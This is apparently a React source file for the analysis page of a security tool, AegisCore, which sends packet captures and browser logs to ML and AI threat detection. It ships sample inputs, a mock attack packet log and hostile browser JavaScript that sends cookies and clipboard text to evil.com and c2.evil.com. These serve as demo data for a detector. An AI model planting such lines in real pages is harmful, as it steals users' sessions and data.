import { useState, useRef, useEffect, useCallback } from "react";
import {
  Upload, Wifi, Globe, FileText, Zap, AlertTriangle, CheckCircle,
  Copy, RefreshCw, Radio, Activity, Play, Square, Terminal, Monitor,
  Shield, ShieldAlert, ShieldOff, Network, Cpu, Server
} from "lucide-react";
import { apiGet, apiDelete, getBaseUrl } from "../lib/api";
import ThreatBadge from "../components/ThreatBadge";

interface FeatureValue { name: string; value: number; category: string; }
interface ModelPredictions { lightgbm: number; lstm: number; ensemble: number; transformer?: number; }
interface ThreatInfo { detected: boolean; type: string | null; score: number; signatureCount: number; topSignatures?: string[]; }
interface ThreatDetections {
  trojan: ThreatInfo;
  mitm: ThreatInfo;
  ddos: ThreatInfo;
  botnet: ThreatInfo;
  dnsSpoofing: ThreatInfo;
  rootkit: ThreatInfo;
}
interface AnalysisResult {
  sessionId: string;
  classification: string;
  confidence: number;
  threatLevel: string;
  features: FeatureValue[];
  modelPredictions: ModelPredictions;
  threatDetections?: ThreatDetections;
  primaryThreat?: string;
  detectedThreats?: string[];
  aiAnalysis: string;
  timestamp: string;
  streaming?: boolean;
}

const WIRESHARK_EXAMPLE = `Frame 1: 74 bytes on wire, TCP SYN
  192.168.1.105 → 185.220.101.45 TCP 55234 → 4444 [SYN]
Frame 2: 66 bytes, TCP SYN-ACK  
  185.220.101.45 → 192.168.1.105 TCP 4444 → 55234 [SYN, ACK]
Frame 3: ARP Who has 192.168.1.1? Tell 192.168.1.105
  Gratuitous ARP: 192.168.1.1 is-at aa:bb:cc:11:22:33 (duplicate IP detected!)
Frame 4: ARP Who has 192.168.1.1? Tell 192.168.1.106
  ARP: 192.168.1.1 is-at dd:ee:ff:44:55:66 (CONFLICT - same IP different MAC!)
Frame 5: DNS Unsolicited Response (no query matched)
  192.168.1.200 → 192.168.1.105 DNS: google.com → 185.220.101.45 NXDOMAIN NXDOMAIN
Frame 6: TCP SYN flood - source 10.0.0.1 pktrate=92.8
  10.0.0.1 → 192.168.1.100 TCP [SYN][SYN][SYN][SYN][SYN] port_scan
Frame 7: IRC connection attempt
  192.168.1.105 → 91.108.4.12 TCP 6667 [IRC] JOIN #botnet beaconing interval=30.0s
Frame 8: SMB2 NEGOTIATE + Lateral Movement
  192.168.1.105 → 192.168.1.100 SMB2 192.168.1.101 192.168.1.102 wmi_activity
Frame 9: DNS Tunneling - long query
  192.168.1.105 → 8.8.8.8 DNS aGVsbG9mb29iYXJiYXpxdXh4eHl6YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnc.evil-exfil.ru A
Frame 10: SSH to Tor exit node :9050
  192.168.1.105 → 185.220.102.8 TCP :9050 [Tor Exit Node detected]`;

const BROWSER_EXAMPLE = `// Browser console capture
eval(unescape('%66%75%6e%63%74%69%6f%6e'));
document.cookie = "session=stolen";
var x = new Image(); x.src = "http://evil.com/steal?c=" + document.cookie;
eval(atob('dmFyIGE9ZG9jdW1lbnQu'));
<iframe src="javascript:void(0)" style="display:none"></iframe>
navigator.clipboard.readText().then(t => fetch('http://c2.evil.com/steal?d='+t));
window.location.href = "http://phishing-site.com";
localStorage.setItem('token', btoa(document.cookie));
var img = document.createElement('canvas'); img.toDataURL();`;

type InputType = "wireshark" | "browser" | "file" | "manual" | "live-browser" | "live-tshark";

function formatPerformanceEntry(e: PerformanceResourceTiming): string {
  const duration = e.duration.toFixed(1);
  const size = e.transferSize ? `${e.transferSize} bytes` : "cached";
  const proto = e.nextHopProtocol || "unknown";
  const url = e.name;
  const type = e.initiatorType;
  return `[${type.toUpperCase()}] ${url} | ${proto} | ${size} | ${duration}ms`;
}

function formatNavigationEntry(e: PerformanceNavigationTiming): string {
  const total = (e.loadEventEnd - e.startTime).toFixed(1);
  return `[NAVIGATION] ${e.name} | ${e.type} | ${total}ms | ${e.transferSize} bytes`;
}

export default function Analyze() {
  const [inputType, setInputType] = useState<InputType>("live-browser");
  const [data, setData] = useState("");
  const [fileName, setFileName] = useState("");
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<AnalysisResult | null>(null);
  const [error, setError] = useState("");
  const fileRef = useRef<HTMLInputElement>(null);

  const [liveBrowserCapturing, setLiveBrowserCapturing] = useState(false);
  const [liveBrowserEntries, setLiveBrowserEntries] = useState<string[]>([]);
  const observerRef = useRef<PerformanceObserver | null>(null);

  const [wsConnected, setWsConnected] = useState(false);
  const [wsLines, setWsLines] = useState<string[]>([]);
  const [wsStatus, setWsStatus] = useState<"idle" | "connecting" | "connected" | "error">("idle");
  const wsRef = useRef<WebSocket | null>(null);
  const wsLiveRef = useRef<string[]>([]);
  const liveTerminalRef = useRef<HTMLDivElement>(null);
  const browserTerminalRef = useRef<HTMLDivElement>(null);

  const getWsUrl = useCallback(() => {
    const base = getBaseUrl();
    const apiPath = base.replace(/^https?/, "").replace(/^:\/\/[^/]+/, "");
    const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
    return `${proto}//${window.location.host}${apiPath}/live-capture/wireshark-ws`;
  }, []);

  const startBrowserCapture = useCallback(() => {
    setLiveBrowserCapturing(true);
    setLiveBrowserEntries([]);

    const nav = performance.getEntriesByType("navigation") as PerformanceNavigationTiming[];
    const initial: string[] = [];
    nav.forEach((e) => initial.push(formatNavigationEntry(e)));
    const resources = performance.getEntriesByType("resource") as PerformanceResourceTiming[];
    resources.forEach((e) => initial.push(formatPerformanceEntry(e)));

    setLiveBrowserEntries(initial);

    const observer = new PerformanceObserver((list) => {
      const entries = list.getEntries();
      const lines: string[] = [];
      entries.forEach((e) => {
        if (e.entryType === "resource") {
          lines.push(formatPerformanceEntry(e as PerformanceResourceTiming));
        } else if (e.entryType === "navigation") {
          lines.push(formatNavigationEntry(e as PerformanceNavigationTiming));
        }
      });
      if (lines.length > 0) {
        setLiveBrowserEntries((prev) => [...prev, ...lines]);
      }
    });

    try {
      observer.observe({ entryTypes: ["resource", "navigation"] });
    } catch {}
    observerRef.current = observer;
  }, []);

  const stopBrowserCapture = useCallback(() => {
    setLiveBrowserCapturing(false);
    observerRef.current?.disconnect();
    observerRef.current = null;
  }, []);

  const connectWsTshark = useCallback(() => {
    if (wsRef.current) {
      wsRef.current.close();
    }
    setWsStatus("connecting");
    setWsLines([]);
    wsLiveRef.current = [];

    const url = getWsUrl();
    const ws = new WebSocket(url);
    wsRef.current = ws;

    ws.onopen = () => {
      setWsStatus("connected");
      setWsConnected(true);
    };

    ws.onmessage = (e) => {
      try {
        const msg = JSON.parse(e.data);
        if (msg.type === "data") {
          wsLiveRef.current = [...wsLiveRef.current, msg.line];
          setWsLines([...wsLiveRef.current]);
        }
      } catch {}
    };

    ws.onerror = () => {
      setWsStatus("error");
      setWsConnected(false);
    };

    ws.onclose = () => {
      setWsStatus("idle");
      setWsConnected(false);
    };
  }, [getWsUrl]);

  const disconnectWs = useCallback(() => {
    wsRef.current?.close();
    wsRef.current = null;
    setWsStatus("idle");
    setWsConnected(false);
  }, []);

  useEffect(() => {
    return () => {
      observerRef.current?.disconnect();
      wsRef.current?.close();
    };
  }, []);

  useEffect(() => {
    if (liveTerminalRef.current) {
      liveTerminalRef.current.scrollTop = liveTerminalRef.current.scrollHeight;
    }
  }, [wsLines]);

  useEffect(() => {
    if (browserTerminalRef.current) {
      browserTerminalRef.current.scrollTop = browserTerminalRef.current.scrollHeight;
    }
  }, [liveBrowserEntries]);

  const handleTypeChange = (t: InputType) => {
    stopBrowserCapture();
    disconnectWs();
    setInputType(t);
    setResult(null);
    setError("");
    if (t === "wireshark") setData(WIRESHARK_EXAMPLE);
    else if (t === "browser") setData(BROWSER_EXAMPLE);
    else setData("");
  };

  const handleFile = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setFileName(file.name);
    const reader = new FileReader();
    reader.onload = (ev) => setData(ev.target?.result as string ?? "");
    reader.readAsText(file);
  };

  const [streamingText, setStreamingText] = useState("");

  const analyze = useCallback(async () => {
    let submitData = data;
    let submitType: string = inputType;

    if (inputType === "live-browser") {
      if (liveBrowserEntries.length === 0) {
        setError("No browser network data captured yet. Click 'Start Capture' first.");
        return;
      }
      submitData = `// AegisCore Live Browser Network Capture\n// Captured ${liveBrowserEntries.length} entries automatically via Performance API\n\n` + liveBrowserEntries.join("\n");
      submitType = "browser";
    } else if (inputType === "live-tshark") {
      const buffer = wsLines.join("\n");
      if (!buffer.trim()) {
        setError("No live tshark data received yet. Connect and pipe tshark output first.");
        return;
      }
      submitData = buffer;
      submitType = "wireshark";
    } else if (!submitData.trim()) {
      setError("Please provide data to analyze");
      return;
    }

    setLoading(true);
    setError("");
    setResult(null);
    setStreamingText("");

    const BASE = getBaseUrl();
    try {
      const response = await fetch(`${BASE}/analysis/submit-stream`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ inputType: submitType, data: submitData, fileName: fileName || undefined }),
      });

      if (!response.ok || !response.body) {
        throw new Error(`API error ${response.status}`);
      }

      const reader = response.body.getReader();
      const decoder = new TextDecoder();
      let buf = "";
      let partialResult: Partial<AnalysisResult> | null = null;
      let accumulated = "";

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        buf += decoder.decode(value, { stream: true });
        const lines = buf.split("\n");
        buf = lines.pop() ?? "";

        for (const line of lines) {
          if (!line.startsWith("data: ")) continue;
          try {
            const msg = JSON.parse(line.slice(6));
            if (msg.type === "verdict") {
              partialResult = {
                sessionId: msg.sessionId,
                classification: msg.classification,
                confidence: msg.confidence,
                threatLevel: msg.threatLevel,
                features: msg.features,
                modelPredictions: msg.modelPredictions,
                threatDetections: msg.threatDetections,
                primaryThreat: msg.primaryThreat,
                detectedThreats: msg.detectedThreats,
                timestamp: msg.timestamp,
                aiAnalysis: "",
                streaming: true,
              };
              setResult(partialResult as AnalysisResult);
            } else if (msg.type === "chunk") {
              accumulated += msg.content;
              setStreamingText(accumulated);
              setResult((prev) => prev ? { ...prev, aiAnalysis: accumulated, streaming: true } : prev);
            } else if (msg.type === "done") {
              setResult((prev) => prev ? { ...prev, streaming: false } : prev);
              setLoading(false);
            }
          } catch {}
        }
      }
    } catch (e) {
      setError(e instanceof Error ? e.message : "Analysis failed");
      setLoading(false);
    }
  }, [data, inputType, liveBrowserEntries, wsLines, fileName]);

  const tsharkCmd = `tshark -i any -l -T fields \\
  -e frame.number -e ip.src -e ip.dst \\
  -e tcp.srcport -e tcp.dstport \\
  -e frame.protocols -e frame.len \\
  -E separator=, -E quote=d | nc -q-1 \\
  "${getWsUrl().replace("wss://", "").replace("ws://", "").split("/api")[0]}" 443`;

  const sourceTypes: { type: InputType; icon: React.ReactNode; label: string; desc: string; badge?: string }[] = [
    { type: "live-browser", icon: <Monitor className="w-4 h-4" />, label: "Live Browser", desc: "Auto-capture network", badge: "AUTO" },
    { type: "live-tshark", icon: <Radio className="w-4 h-4" />, label: "Live tshark", desc: "Real-time packet stream", badge: "LIVE" },
    { type: "wireshark", icon: <Wifi className="w-4 h-4" />, label: "Wireshark", desc: "PCAP / packet data" },
    { type: "browser", icon: <Globe className="w-4 h-4" />, label: "Browser Logs", desc: "Console / network logs" },
    { type: "file", icon: <Upload className="w-4 h-4" />, label: "File Upload", desc: "Binary / log files" },
    { type: "manual", icon: <FileText className="w-4 h-4" />, label: "Manual", desc: "Raw text / hex dump" },
  ];

  const canAnalyze = () => {
    if (inputType === "live-browser") return liveBrowserEntries.length > 0;
    if (inputType === "live-tshark") return wsLines.length > 0;
    return data.trim().length > 0;
  };

  return (
    <div className="p-6 max-w-7xl mx-auto space-y-6">
      <div>
        <h1 className="text-2xl font-bold text-foreground">Dynamic Analysis Engine</h1>
        <p className="text-sm text-muted-foreground mt-1">
          Auto-capture live browser traffic, stream real-time Wireshark/tshark packets, or feed data manually for AI-powered malware analysis
        </p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="space-y-4">
          <div className="rounded-xl border border-border bg-card overflow-hidden">
            <div className="px-4 py-3 border-b border-border">
              <div className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">Input Source</div>
            </div>
            <div className="grid grid-cols-3 gap-2 p-3">
              {sourceTypes.map(({ type, icon, label, desc, badge }) => (
                <button
                  key={type}
                  onClick={() => handleTypeChange(type)}
                  className={`relative flex items-start gap-2 p-3 rounded-lg border text-left transition-all ${
                    inputType === type
                      ? "border-primary/40 bg-primary/10 text-primary"
                      : "border-border bg-muted/10 text-muted-foreground hover:border-border/60 hover:text-foreground"
                  }`}
                >
                  {badge && (
                    <span className="absolute top-1.5 right-1.5 text-[8px] font-bold px-1 py-0.5 rounded bg-emerald-500/20 text-emerald-400 leading-none">
                      {badge}
                    </span>
                  )}
                  <div className="mt-0.5 shrink-0">{icon}</div>
                  <div>
                    <div className="text-xs font-semibold leading-none">{label}</div>
                    <div className="text-[9px] mt-1 opacity-70 leading-tight">{desc}</div>
                  </div>
                </button>
              ))}
            </div>
          </div>

          {inputType === "live-browser" && (
            <div className="rounded-xl border border-border bg-card overflow-hidden">
              <div className="px-4 py-3 border-b border-border flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className={`w-2 h-2 rounded-full ${liveBrowserCapturing ? "bg-emerald-400 animate-pulse" : "bg-muted"}`} />
                  <div className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">
                    Live Browser Capture
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  {liveBrowserEntries.length > 0 && (
                    <span className="text-[10px] text-emerald-400 font-mono">{liveBrowserEntries.length} entries</span>
                  )}
                  {liveBrowserCapturing ? (
                    <button
                      onClick={stopBrowserCapture}
                      className="flex items-center gap-1.5 px-2.5 py-1.5 bg-red-500/20 text-red-400 border border-red-500/30 rounded-lg text-xs font-semibold hover:bg-red-500/30 transition-all"
                    >
                      <Square className="w-3 h-3" /> Stop
                    </button>
                  ) : (
                    <button
                      onClick={startBrowserCapture}
                      className="flex items-center gap-1.5 px-2.5 py-1.5 bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded-lg text-xs font-semibold hover:bg-emerald-500/30 transition-all"
                    >
                      <Play className="w-3 h-3" /> Start Capture
                    </button>
                  )}
                </div>
              </div>
              <div className="p-3 space-y-2">
                <div className="flex items-start gap-2 p-2.5 rounded-lg bg-blue-500/10 border border-blue-500/20 text-xs text-blue-300">
                  <Activity className="w-3.5 h-3.5 mt-0.5 shrink-0" />
                  <span>Automatically captures all network requests from this browser tab using the Performance API — no permissions required. Works instantly.</span>
                </div>
                <div
                  ref={browserTerminalRef}
                  className="h-52 bg-black/40 border border-border rounded-lg p-3 overflow-y-auto font-mono text-[10px] text-green-300 space-y-0.5"
                >
                  {liveBrowserEntries.length === 0 ? (
                    <span className="text-muted-foreground/50">Click "Start Capture" to begin monitoring browser network activity...</span>
                  ) : (
                    liveBrowserEntries.map((line, i) => (
                      <div key={i} className="hover:bg-white/5 px-1 rounded truncate">{line}</div>
                    ))
                  )}
                </div>
                {liveBrowserEntries.length > 0 && (
                  <button
                    onClick={() => { setLiveBrowserEntries([]); stopBrowserCapture(); startBrowserCapture(); }}
                    className="text-xs text-muted-foreground hover:text-foreground flex items-center gap-1"
                  >
                    <RefreshCw className="w-3 h-3" /> Clear & restart
                  </button>
                )}
              </div>
            </div>
          )}

          {inputType === "live-tshark" && (
            <div className="rounded-xl border border-border bg-card overflow-hidden">
              <div className="px-4 py-3 border-b border-border flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className={`w-2 h-2 rounded-full ${
                    wsStatus === "connected" ? "bg-emerald-400 animate-pulse" :
                    wsStatus === "connecting" ? "bg-yellow-400 animate-pulse" :
                    wsStatus === "error" ? "bg-red-400" : "bg-muted"
                  }`} />
                  <div className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">
                    Live tshark Stream
                  </div>
                  <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded leading-none ${
                    wsStatus === "connected" ? "bg-emerald-500/20 text-emerald-400" :
                    wsStatus === "connecting" ? "bg-yellow-500/20 text-yellow-400" :
                    wsStatus === "error" ? "bg-red-500/20 text-red-400" :
                    "bg-muted/20 text-muted-foreground"
                  }`}>
                    {wsStatus.toUpperCase()}
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  {wsLines.length > 0 && (
                    <span className="text-[10px] text-emerald-400 font-mono">{wsLines.length} packets</span>
                  )}
                  {wsStatus !== "connected" ? (
                    <button
                      onClick={connectWsTshark}
                      className="flex items-center gap-1.5 px-2.5 py-1.5 bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded-lg text-xs font-semibold hover:bg-emerald-500/30 transition-all"
                    >
                      <Radio className="w-3 h-3" /> Connect
                    </button>
                  ) : (
                    <button
                      onClick={disconnectWs}
                      className="flex items-center gap-1.5 px-2.5 py-1.5 bg-red-500/20 text-red-400 border border-red-500/30 rounded-lg text-xs font-semibold hover:bg-red-500/30 transition-all"
                    >
                      <Square className="w-3 h-3" /> Disconnect
                    </button>
                  )}
                </div>
              </div>
              <div className="p-3 space-y-2">
                {wsStatus === "connected" && (
                  <div className="space-y-1">
                    <div className="text-[10px] text-muted-foreground font-semibold uppercase tracking-widest mb-1">
                      Pipe tshark output to AegisCore — copy this command:
                    </div>
                    <div className="flex items-start gap-2 bg-black/40 border border-border rounded-lg p-2.5">
                      <Terminal className="w-3.5 h-3.5 text-muted-foreground mt-0.5 shrink-0" />
                      <code className="text-[10px] font-mono text-cyan-300 flex-1 leading-relaxed break-all">
                        tshark -i any -l | websocat {getWsUrl()}
                      </code>
                      <button
                        onClick={() => navigator.clipboard.writeText(`tshark -i any -l | websocat ${getWsUrl()}`)}
                        className="text-muted-foreground hover:text-foreground shrink-0"
                      >
                        <Copy className="w-3 h-3" />
                      </button>
                    </div>
                    <div className="text-[9px] text-muted-foreground/60">
                      Requires: tshark (Wireshark CLI) + websocat. Or manually paste tshark output below in the Wireshark tab.
                    </div>
                  </div>
                )}

                {wsStatus === "idle" && (
                  <div className="flex items-start gap-2 p-2.5 rounded-lg bg-blue-500/10 border border-blue-500/20 text-xs text-blue-300">
                    <Radio className="w-3.5 h-3.5 mt-0.5 shrink-0" />
                    <span>Click Connect to open a WebSocket endpoint. Then pipe your tshark output directly into AegisCore for real-time analysis.</span>
                  </div>
                )}

                {wsStatus === "error" && (
                  <div className="flex items-start gap-2 p-2.5 rounded-lg bg-red-500/10 border border-red-500/20 text-xs text-red-300">
                    <AlertTriangle className="w-3.5 h-3.5 mt-0.5 shrink-0" />
                    <span>WebSocket connection failed. Click Connect to retry.</span>
                  </div>
                )}

                <div
                  ref={liveTerminalRef}
                  className="h-52 bg-black/40 border border-border rounded-lg p-3 overflow-y-auto font-mono text-[10px] text-green-300 space-y-0.5"
                >
                  {wsLines.length === 0 ? (
                    <span className="text-muted-foreground/50">
                      {wsStatus === "connected" ? "Waiting for tshark data... pipe output now." : "Connect first, then pipe tshark output."}
                    </span>
                  ) : (
                    wsLines.slice(-200).map((line, i) => (
                      <div key={i} className="hover:bg-white/5 px-1 rounded">{line}</div>
                    ))
                  )}
                </div>

                {wsLines.length > 0 && (
                  <button
                    onClick={() => { setWsLines([]); wsLiveRef.current = []; }}
                    className="text-xs text-muted-foreground hover:text-foreground flex items-center gap-1"
                  >
                    <RefreshCw className="w-3 h-3" /> Clear buffer
                  </button>
                )}
              </div>
            </div>
          )}

          {(inputType === "wireshark" || inputType === "browser" || inputType === "manual") && (
            <div className="rounded-xl border border-border bg-card overflow-hidden">
              <div className="px-4 py-3 border-b border-border flex items-center justify-between">
                <div className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">Data Input</div>
                <button
                  onClick={() => { setData(""); setFileName(""); }}
                  className="text-xs text-muted-foreground hover:text-foreground flex items-center gap-1"
                >
                  <RefreshCw className="w-3 h-3" /> Clear
                </button>
              </div>
              <div className="p-3">
                <textarea
                  value={data}
                  onChange={(e) => setData(e.target.value)}
                  placeholder={inputType === "wireshark"
                    ? "Paste Wireshark packet data, PCAP text export, or tshark output..."
                    : inputType === "browser"
                      ? "Paste browser console logs, network requests, or JavaScript source..."
                      : "Paste raw data, hex dump, or log content..."
                  }
                  className="w-full h-64 bg-black/30 border border-border rounded-lg p-3 text-xs font-mono text-green-300 resize-none focus:outline-none focus:border-primary/50 placeholder:text-muted-foreground/40"
                />
                <div className="text-[10px] text-muted-foreground mt-1">
                  {data.length} characters
                </div>
              </div>
            </div>
          )}

          {inputType === "file" && (
            <div className="rounded-xl border border-border bg-card overflow-hidden">
              <div className="px-4 py-3 border-b border-border">
                <div className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">File Upload</div>
              </div>
              <div className="p-4 space-y-3">
                <div
                  onClick={() => fileRef.current?.click()}
                  className="border-2 border-dashed border-border rounded-lg p-8 text-center cursor-pointer hover:border-primary/40 hover:bg-primary/5 transition-all"
                >
                  <Upload className="w-8 h-8 text-muted-foreground mx-auto mb-2" />
                  <div className="text-sm text-foreground font-medium">Drop file or click to browse</div>
                  <div className="text-xs text-muted-foreground mt-1">.pcap, .pcapng, .log, .exe, .dll, .bin</div>
                  {fileName && <div className="mt-2 text-xs text-primary font-mono">{fileName}</div>}
                </div>
                <input ref={fileRef} type="file" className="hidden" onChange={handleFile}
                  accept=".pcap,.pcapng,.log,.txt,.exe,.dll,.bin,.json,.xml,.csv" />
                {data && (
                  <textarea
                    value={data.slice(0, 2000)}
                    readOnly
                    className="w-full h-24 bg-black/30 border border-border rounded-lg p-3 text-xs font-mono text-muted-foreground resize-none"
                  />
                )}
              </div>
            </div>
          )}

          {error && (
            <div className="flex items-center gap-2 p-3 rounded-lg bg-red-500/10 border border-red-500/30 text-sm text-red-400">
              <AlertTriangle className="w-4 h-4 shrink-0" />
              {error}
            </div>
          )}

          <button
            onClick={analyze}
            disabled={loading || !canAnalyze()}
            className="w-full flex items-center justify-center gap-2 px-6 py-3 bg-primary text-primary-foreground rounded-lg font-semibold hover:bg-primary/90 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {loading ? (
              <>
                <div className="w-4 h-4 border-2 border-primary-foreground border-t-transparent rounded-full animate-spin" />
                {result ? "Streaming AI Report..." : "Extracting Features..."}
              </>
            ) : (
              <>
                <Zap className="w-4 h-4" />
                {inputType === "live-browser"
                  ? `Analyze ${liveBrowserEntries.length} Captured Requests`
                  : inputType === "live-tshark"
                    ? `Analyze ${wsLines.length} Live Packets`
                    : "Analyze Now"}
              </>
            )}
          </button>
        </div>

        <div className="space-y-4">
          {result ? (
            <>
              <div className={`rounded-xl border p-5 ${
                result.threatLevel === "critical" ? "border-red-500/40 bg-red-500/5" :
                result.threatLevel === "high" ? "border-orange-500/40 bg-orange-500/5" :
                result.threatLevel === "medium" ? "border-yellow-500/40 bg-yellow-500/5" :
                result.threatLevel === "benign" ? "border-green-500/40 bg-green-500/5" :
                "border-blue-500/40 bg-blue-500/5"
              }`}>
                <div className="flex items-start justify-between">
                  <div>
                    <div className="flex items-center gap-2 mb-1">
                      <ThreatBadge level={result.threatLevel} />
                      <code className="text-[10px] text-muted-foreground">{result.sessionId}</code>
                    </div>
                    <div className="text-xl font-bold text-foreground mt-1">{result.classification}</div>
                    <div className="text-sm text-muted-foreground mt-1">
                      Confidence: <span className="text-foreground font-semibold">{(result.confidence * 100).toFixed(1)}%</span>
                    </div>
                  </div>
                  {result.threatLevel === "benign" ? (
                    <CheckCircle className="w-8 h-8 text-green-400" />
                  ) : (
                    <AlertTriangle className="w-8 h-8 text-red-400" />
                  )}
                </div>
              </div>

              <div className="rounded-xl border border-border bg-card p-4">
                <div className="text-xs font-semibold text-muted-foreground uppercase tracking-widest mb-3">Ensemble Model Predictions</div>
                <div className="space-y-2.5">
                  {[
                    { label: "LightGBM (Gradient Boost)", value: result.modelPredictions.lightgbm, color: "bg-emerald-400" },
                    { label: "BiLSTM (Sequence Model)", value: result.modelPredictions.lstm, color: "bg-blue-400" },
                    { label: "Transformer (Attention)", value: result.modelPredictions.transformer ?? 0, color: "bg-violet-400" },
                    { label: "Ensemble (35/30/25/10)", value: result.modelPredictions.ensemble, color: "bg-primary" },
                  ].map(({ label, value, color }) => (
                    <div key={label}>
                      <div className="flex justify-between text-xs mb-1">
                        <span className="text-muted-foreground">{label}</span>
                        <span className="text-foreground font-semibold tabular-nums">{(value * 100).toFixed(1)}%</span>
                      </div>
                      <div className="h-2 rounded-full bg-muted overflow-hidden">
                        <div className={`h-full rounded-full ${color} transition-all`} style={{ width: `${value * 100}%` }} />
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {result.threatDetections && (
                <div className="rounded-xl border border-border bg-card overflow-hidden">
                  <div className="px-4 py-3 border-b border-border flex items-center justify-between">
                    <div className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">Multi-Threat Detection Suite</div>
                    {result.detectedThreats && result.detectedThreats.length > 0 && (
                      <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-red-500/20 text-red-400 border border-red-500/30">
                        {result.detectedThreats.length} THREAT{result.detectedThreats.length > 1 ? "S" : ""} ACTIVE
                      </span>
                    )}
                  </div>
                  <div className="p-3 grid grid-cols-2 gap-2">
                    {([
                      { key: "trojan", label: "Trojan", icon: <ShieldOff className="w-3.5 h-3.5" />, info: result.threatDetections.trojan },
                      { key: "mitm", label: "MITM", icon: <Network className="w-3.5 h-3.5" />, info: result.threatDetections.mitm },
                      { key: "ddos", label: "DDoS/DoS", icon: <Zap className="w-3.5 h-3.5" />, info: result.threatDetections.ddos },
                      { key: "botnet", label: "Botnet", icon: <Server className="w-3.5 h-3.5" />, info: result.threatDetections.botnet },
                      { key: "dnsSpoofing", label: "DNS Spoof", icon: <Globe className="w-3.5 h-3.5" />, info: result.threatDetections.dnsSpoofing },
                      { key: "rootkit", label: "Rootkit", icon: <Cpu className="w-3.5 h-3.5" />, info: result.threatDetections.rootkit },
                    ] as { key: string; label: string; icon: React.ReactNode; info: ThreatInfo }[]).map(({ key, label, icon, info }) => (
                      <div key={key} className={`rounded-lg border p-2.5 ${info.detected ? "border-red-500/40 bg-red-950/20" : "border-border bg-muted/10"}`}>
                        <div className="flex items-center justify-between mb-1.5">
                          <div className={`flex items-center gap-1.5 text-[11px] font-semibold ${info.detected ? "text-red-400" : "text-muted-foreground"}`}>
                            {icon}{label}
                          </div>
                          {info.detected ? (
                            <span className="text-[9px] font-bold px-1 py-0.5 rounded bg-red-500/20 text-red-400 border border-red-500/30">ALERT</span>
                          ) : (
                            <span className="text-[9px] font-bold px-1 py-0.5 rounded bg-green-500/10 text-green-500 border border-green-500/20">CLEAR</span>
                          )}
                        </div>
                        <div className="h-1.5 rounded-full bg-muted overflow-hidden mb-1.5">
                          <div className={`h-full rounded-full transition-all ${info.detected ? "bg-red-500" : "bg-green-500/50"}`} style={{ width: `${Math.min(100, info.score * 100)}%` }} />
                        </div>
                        <div className="text-[10px] text-muted-foreground">
                          {info.detected ? (
                            <span className="text-red-300 font-mono truncate block">{info.type}</span>
                          ) : (
                            <span>{(info.score * 100).toFixed(0)}% confidence</span>
                          )}
                        </div>
                        {info.detected && info.signatureCount > 0 && (
                          <div className="text-[9px] text-red-400/70 mt-0.5">{info.signatureCount} signature{info.signatureCount > 1 ? "s" : ""} matched</div>
                        )}
                        {info.detected && info.topSignatures && info.topSignatures.length > 0 && (
                          <div className="mt-1.5 pt-1.5 border-t border-red-500/20 space-y-0.5">
                            {info.topSignatures.slice(0, 2).map((sig, i) => (
                              <div key={i} className="text-[9px] text-red-300/70 font-mono truncate">• {sig}</div>
                            ))}
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                  {result.primaryThreat && result.primaryThreat !== "None" && (
                    <div className="px-4 py-2 border-t border-border bg-red-950/10 flex items-center gap-2">
                      <ShieldAlert className="w-3.5 h-3.5 text-red-400 shrink-0" />
                      <span className="text-[11px] text-red-300">Primary: <span className="font-bold font-mono">{result.primaryThreat}</span></span>
                    </div>
                  )}
                </div>
              )}

              {result.features.length > 0 && (
                <div className="rounded-xl border border-border bg-card overflow-hidden">
                  <div className="px-4 py-3 border-b border-border">
                    <div className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">
                      Feature Extraction Vector
                    </div>
                  </div>
                  <div className="p-3 max-h-44 overflow-y-auto font-mono text-xs space-y-1">
                    {result.features.slice(0, 20).map((f) => (
                      <div key={f.name} className="flex justify-between items-center py-0.5 border-b border-border/30">
                        <span className="text-muted-foreground">{f.name}</span>
                        <span className={`font-semibold ${
                          f.category === "network" ? "text-cyan-400" :
                          f.category === "system" ? "text-orange-400" :
                          "text-purple-400"
                        }`}>{f.value}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              <div className="rounded-xl border border-border bg-card overflow-hidden">
                <div className="px-4 py-3 border-b border-border flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <div className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">AI Analysis Report</div>
                    {result.streaming && (
                      <span className="flex items-center gap-1 text-[10px] text-emerald-400 font-semibold">
                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                        Streaming
                      </span>
                    )}
                  </div>
                  {!result.streaming && result.aiAnalysis && (
                    <button
                      onClick={() => navigator.clipboard.writeText(result.aiAnalysis)}
                      className="text-xs text-muted-foreground hover:text-foreground flex items-center gap-1"
                    >
                      <Copy className="w-3 h-3" /> Copy
                    </button>
                  )}
                </div>
                <div className="p-4 max-h-80 overflow-y-auto">
                  {result.aiAnalysis ? (
                    <pre className="text-xs text-foreground whitespace-pre-wrap leading-relaxed font-mono">
                      {result.aiAnalysis}
                      {result.streaming && <span className="inline-block w-2 h-3.5 bg-emerald-400 ml-0.5 animate-pulse align-middle" />}
                    </pre>
                  ) : (
                    <div className="flex items-center gap-2 text-xs text-muted-foreground">
